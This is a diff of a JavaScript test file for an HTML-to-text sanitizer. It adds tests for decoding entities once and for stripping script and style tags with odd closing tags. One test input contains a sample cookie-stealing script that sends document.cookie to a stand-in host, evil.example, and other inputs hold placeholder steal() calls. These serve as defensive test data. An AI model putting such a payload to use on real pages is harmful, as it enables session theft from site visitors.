@@ -92,6 +92,16 @@ describe("connector contracts", () => {
     expect(textFromHtml('<p>Hi</p><script>fetch("https://evil.example?c="+document.cookie)</script>')).toBe("Hi");
   });
 
+  it("decodes each entity once, so escaped markup stays text", () => {
+    expect(textFromHtml("a &amp;lt;b&amp;gt; &amp;amp; c")).toBe("a &lt;b&gt; &amp; c");
+    expect(textFromHtml("x &lt;y&gt; &quot;z&quot; &#39;w&#39; &amp; v")).toBe(`x <y> "z" 'w' & v`);
+  });
+
+  it("removes scripts and styles whose closing tags carry spaces, attributes or capitals", () => {
+    expect(textFromHtml("<p>Hi</p><script>steal()</script >there")).toBe("Hi there");
+    expect(textFromHtml("<SCRIPT type=x>steal()</SCRIPT\n foo=bar>ok<style>p{}</style\t>!")).toBe("ok !");
+  });
+
   it("refuses account, label, and bound escapes before any traffic", async () => {
     const { fetch, seen } = stubFetch({});
     await expect(
